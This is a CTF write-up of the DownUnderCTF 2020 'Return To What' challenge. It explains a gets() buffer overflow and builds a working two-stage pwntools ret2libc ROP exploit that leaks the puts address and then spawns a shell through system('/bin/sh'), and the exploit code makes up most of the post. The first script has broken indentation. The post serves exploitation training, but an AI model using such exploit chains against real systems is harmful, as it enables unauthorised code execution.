---
title: Return To What - DownUnderCTF 2020
author: pwndumb
date: 2021-03-01 14:10:00 +0800
categories: [Pwn,Linux]
tags: [linux,pwn,linux,rop]
---

# Synopsis

The application has a *buffer overflow in gets function*. I will abuse that for create two `ROP`: One for leak the address of `put` in `libc` and other to call `system` with `/bin/sh`.  In the middle of process I learned a little how use `pwntools` to create `gadgets`. 

> 10 min read.

## Skills Required

- gdb 101 
- A little bit of knowledge about calling convention in 64 bits
- Vanilla buffer overflow 
- Patience 

## Skills Learned

- ROP 101
- Pwntools 101

# The Vulnerable application 

The application it's a simple `ELF 64` program that display a message and wait for user input. To replicate the `CTF environment` I created a `docker` with the challenge setup. Just follow instructions in the link below to have a challenge running in port 1337 of your machine.  

- [Return to What, DownUnderCTF 2020](https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/pwn/return-to-what)


## Setup The Application

For this task I did a docker. Its well documented, so all you have to do is run the commands in commentary if you already docker setup. Otherwise you must install docker first, google is your best friend. 

```bash
$ docker build -t returntowhat:downunderctf .
$ sudo docker run --rm -v --cap-add=SYS_PTRACE -p 1337:1337 -d --name returntowhat -i returntowhat:downunderct
```

Lets check if works fine: 

```bash
$ sudo docker ps
CONTAINER ID   IMAGE                       COMMAND                  CREATED       STATUS       PORTS                    NAMES
351e7a160dc8   returntowhat:downunderctf   "socat -T60 TCP-LIST…"   5 hours ago   Up 5 hours   0.0.0.0:1337->1337/tcp   returntowhat

```

## Analysis of the binary 

Let's see how program works. Just connect with `netcat` in port `1337`. The output is something like the lines below:

```bash
$ nc -nv 192.168.64.131 1337
Connection to 192.168.64.131 1337 port [tcp/*] succeeded!
Today, we'll have a lesson in returns.
Where would you like to return to?

```

Running `checksec` against the program:

```bash
[*] 'return-to-what'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
So the binary has `NX` enable. We can't execute shellcode in `stack`, but for our lucky the `Partial RELRO` is enabled, which means we can try to do a `ret-to-libc` attack.  
Let's analyse the program in debugger and  disassembler to see how to do this attack.

## Disassemble the program in `gdb` and Analyze in `radare2`
Checking the main function I found two things that came of my eyes: One is the `vuln` function and other is `gets` inside the `vuln`.  `gets` is a problematic function. According the man:

> DESCRIPTION  

> Never use this function.  
gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null  byte  ('\0'). No check for buffer overrun is performed (see BUGS below).


```c
[0x004011ad]> pdf
            ; DATA XREF from entry0 @ 0x40107d
┌ 33: int main (int argc, char **argv, char **envp);
│           0x004011ad      55             push rbp
│           0x004011ae      4889e5         mov rbp, rsp
│           0x004011b1      488d3d780e00.  lea rdi, qword str.Today__we_ll_have_a_lesson_in_returns. ; 0x402030 ; "Today, we'll have a lesson in returns." ; const char *s
│           0x004011b8      e873feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011bd      b800000000     mov eax, 0
│           0x004011c2      e8beffffff     call sym.vuln # The name is very important here!!! :)
│           0x004011c7      b800000000     mov eax, 0
│           0x004011cc      5d             pop rbp
└           0x004011cd      c3             ret
[0x004011ad]> 

```

## The `vuln` function

The vuln function put the string that you saw in `rdi` and call `puts`. In the next lines the program setup the variables in register to call `gets`function.  Pay attention in size of input buffer expect in gets that is equal `0x30=48`. Here is our buffer overflow.

```
[0x00401185]> pdf
            ; CALL XREF from main @ 0x4011c2
┌ 40: sym.vuln ();
│           ; var char *s @ rbp-0x30
│           0x00401185      55             push rbp
│           0x00401186      4889e5         mov rbp, rsp
│           0x00401189      4883ec30       sub rsp, 0x30 # size of our input buffer
│           0x0040118d      488d3d740e00.  lea rdi, qword str.Where_would_you_like_to_return_to ; 0x402008 ; "Where would you like to return to?" ; const char *s
│           0x00401194      e897feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401199      488d45d0       lea rax, qword [s]
│           0x0040119d      4889c7         mov rdi, rax                ; char *s
│           0x004011a0      b800000000     mov eax, 0
│           0x004011a5      e896feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004011aa      90             nop
│           0x004011ab      c9             leave
└           0x004011ac      c3             ret
[0x00401185]>

```

# The Plan
 The main idea is use `buffer overflow` in `gets` to leak `puts` address in `libc`. For this we create a `ROP`
gadgets that me allow jump to the code in stack that I have put after the buffer overflow. 
> understanding the differences between `got` and `plt` is crucial.

## Leaked puts 
The first step of our plan is setup `plt@got` as parameter for `puts@plt`. 

```python
from pwn import *

def main():

    # log level
    context.terminal = ["tmux", "splitw", "-v"]
    context.log_level = 'DEBUG'

    # setup process in pwntools
    context.arch = "amd64"
    elf=ELF("./return-to-what")
    p=elf.process()

    #p=remote("192.1",1337)

    # The buffer looks like this to create a rop that will 
    # leak address of put.
    # padding + pop_rdi + puts_got + puts_plt + main_plt

    # trigger buffer overflow
    offset = 56
    padding = b"A" * offset


    # create rop chain

    # 0x000000000040122b : pop rdi ; ret
    pop_rdi = p64(0x000000000040122b)
    puts_got = p64(elf.got["puts"])
    puts_plt = p64(elf.plt["puts"])

    # return to main to excute again
    main_plt = p64(elf.symbols["main"])

    rop = pop_rdi + puts_got + puts_plt + main_plt

    # create buffer
    buffer = [
        padding,
        rop
        ]

buffer = b"".join(buffer)

# start process
print(p.recvuntil("\n"))
print(p.recvuntil("\n"))

# send the buffer
p.sendline(buffer)

# print address of put in libc
puts_address=u64(p.recvuntil("\n").strip().ljust(8,b"\x00"))
info(f"Puts address: {hex(puts_address)}")

# interact with process
p.interactive() 

if __name__ == "__main__":
main()

```

![leaked-puts-address](https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/return-to-what/leaked-puts-address.png)

The script work as expected. Now I used one of many libc databases on internet do check what libc is. 

After check in [https://libc.nullbyte.cat/?q=puts%3Ad90](https://libc.nullbyte.cat/?q=puts%3Ad90). I confirm that is correct and in match to libc running n my system locally:

## Calculate libc base address

Now we know what the libc is, we can easily calculate the libc base address. What this is necessary ? With this information we can calculate the offset of system function and the string "/bin/sh". That all information we need to construct a `rop chain` that will gave us a nice shell. 

```python
#!/usr/bin/env python3
from pwn import *

def main():

    # log level
    context.terminal = ["tmux", "splitw", "-v"]
    context.log_level = 'DEBUG'

    # setup process in pwntools
    context.arch = "amd64"
    elf=ELF("./return-to-what")
    p=elf.process()

    #p=remote("192.168.64.131",1337)


    # The buffer looks like this to create a rop that will 
    # leak address of put.
    # padding + pop_rdi + puts_got + puts_plt + main_plt
    
    # trigger buffer overflow
    offset = 56 
    padding = b"A" * offset


    # create rop chain
     
    # 0x000000000040122b : pop rdi ; ret
    pop_rdi = p64(0x000000000040122b)
    puts_got = p64(elf.got["puts"])
    puts_plt = p64(elf.plt["puts"])
    main_plt = p64(elf.symbols["main"])

    rop = pop_rdi + puts_got + puts_plt + main_plt
    
    # create buffer
    buffer = [
            padding,
            rop
            ]

    buffer = b"".join(buffer)
    # start process
    print(p.recvuntil("\n"))
    print(p.recvuntil("\n"))

    # send the buffer
    p.sendline(buffer)

    # print address of put in libc
    puts_address=u64(p.recvuntil("\n").strip().ljust(8,b"\x00"))
    info(f"Puts address: {hex(puts_address)}")
   
    # calculate libc base address
    libc=ELF("./libc6_2.27-3ubuntu1.3_amd64.so")
    libc.address = puts_address - libc.symbols["puts"]
    info(f"libc base address: {hex(libc.address)}")

    # interact with process
    p.interactive() 


if __name__ == "__main__":
    main()

```

![LIBC-Base Address](https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/return-to-what/libc-base-address.png)

# Final Exploit

Now we already know the base address of libc, we can calculate the address of `/bin/sh` and `system` inside the libc. This information will be used to pwn system.  
The second payload will be like the first, but now we not return to main. Instead we try to return to `system` with `/bin/sh` as parameter. 

```python
#!/usr/bin/env python3

from pwn import *

def main():

    # log level
    context.terminal = ["tmux", "splitw", "-v"]
    context.log_level = 'DEBUG'

    # setup process in pwntools
    context.arch = "amd64"
    elf=context.binary=ELF("./return-to-what")
    libc=ELF("./libc6_2.27-3ubuntu1.3_amd64.so")
    p=remote("192.168.0.22",1337)

    # The exploit will be two stages:
    # 1. The payload of stage 1 will leak address of
    # put and return to main function to execute the
    # program again.
    # 2. The second stage will send a buffer with rop chain that will
    # give us a shell.


    ############### Stage 1 Payload  #############################

    # The fisrt paylaod will create a rop that will leak put address
    # and return to main.  
    # padding + pop_rdi + puts_got + puts_plt + main_plt

    # trigger buffer overflow

    offset = 56
    padding = b"A" * offset


    # create rop chain

    # 0x000000000040122b : pop rdi ; ret

    puts_got = p64(elf.got["puts"])
    puts_plt = p64(elf.plt["puts"])
    main_plt = p64(elf.symbols["main"] + 1 ) # this plus one is for stack alignment

    # create a rop chain with pwntools

    rop=ROP(elf)
    pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])

    # create buffer

    stage1_payload = [
            padding,
            pop_rdi,
            puts_got,
            puts_plt,
            main_plt
            ]

    stage1_payload = b"".join(stage1_payload)

    # send the stage 1 payload

    p.sendlineafter("?\n",stage1_payload)

    # print address of put in libc

    puts_leaked=u64(p.recvuntil("\n").strip().ljust(8,b"\x00"))
    info(f"Puts LEAK address: {hex(puts_leaked)}")

    # calculate libc base address

    libc_base_address = puts_leaked - libc.symbols['puts']

    #print the base address

    info(f"LIBC BASE address: {hex(libc_base_address)}")

    ############### Stage 2 Payload  #############################
    
    # The second payload will send when the firt return to main. 
    # The payload is a rop chain that will gave us a nice shell
    # 
    # padding + pop_rdi + binsh + system


    # calculate the address of system and "/bin/sh" inside libc

    system_inside_libc=libc.symbols['system']
    binsh_inside_libc=next(libc.search(b'/bin/sh'))
    exit_iniside_libc=libc.symbols['exit']


    # Now calculate the real address in execution time

    system=p64(libc_base_address + system_inside_libc)
    binsh=p64(libc_base_address + binsh_inside_libc)
    exit=p64(libc_base_address + exit_iniside_libc)

    # join all and send as second input. Crossfinger !!!
    # padding + pop_rdi + binsh + system

    stage2_payload = [
        padding,
        pop_rdi,
        binsh,
        system,
        exit
    ]

    stage2_payload = b"".join(stage2_payload)

    # send stage 2 payload

    p.sendlineafter("?\n",stage2_payload)

    # interact with process

    p.interactive()


if __name__ == "__main__":
    main()
```

![Getting Shell](https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/return-to-what/vim-awesome-script-terminal-running.png)

## Reference Links

- [LiveOverflow BinExploitation Youtube List](https://youtu.be/iyAyN3GFM7A)
- [bi0s wiki](https://wiki.bi0s.in/pwning/return2libc/return-to-libc/)
- [Return to Libc by Saif El-Sherei](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)
- [Rop Code Arcana](https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
